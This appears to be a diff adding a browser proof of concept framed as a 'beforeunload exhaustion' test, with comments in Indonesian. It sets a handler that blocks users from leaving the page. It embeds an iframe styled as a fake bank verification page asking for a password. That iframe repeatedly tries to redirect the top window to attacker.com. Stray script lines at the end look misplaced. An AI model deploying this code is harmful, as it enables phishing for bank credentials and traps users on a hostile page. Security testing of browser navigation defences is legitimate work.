@@ -1,3 +1,53 @@
+<iframe id="attackFrame" style="width:100%;height:400px;border:none;"></iframe>
+
 <script>
+function testBeforeunloadExhaust() {
+  console.log('[C] Testing beforeunload exhaustion...');
+
+  // beforeunload di halaman utama
+  window.onbeforeunload = (e) => {
+    e.preventDefault();
+    e.returnValue = '';
+    return '';
+  };
+
+  console.log('[C] Beforeunload handler set');
+
+  const iframe = document.getElementById('attackFrame');
+
+  iframe.srcdoc = `
+    <html>
+    <head><title>Security Check</title></head>
+    <body style="font-family:Arial;padding:40px;">
+      <h2>Account Verification</h2>
+      <p>Your bank requires additional verification.</p>
+
+      <input type="password" placeholder="Enter password"
+        style="width:300px;padding:10px;display:block;margin:8px 0;border:1px solid #ccc;border-radius:4px;">
+
+      <button style="padding:10px 30px;background:#1a73e8;color:#fff;border:none;border-radius:4px;cursor:pointer;">
+        Verify
+      </button>
+
+      <script>
+        let count = 0;
+
+        function tryNav() {
+          count++;
+          try {
+            // iframe coba redirect parent
+            window.top.location.href = 'https://attacker.com/kocak?attempt=' + count;
+          } catch(e) {}
+        }
+
+        setInterval(tryNav, 2000);
+      <\/script>
+    </body>
+    </html>
+  `;
+}
+
+testBeforeunloadExhaust();
+</script>
 window.top.location = "https://c.com";
 <script>
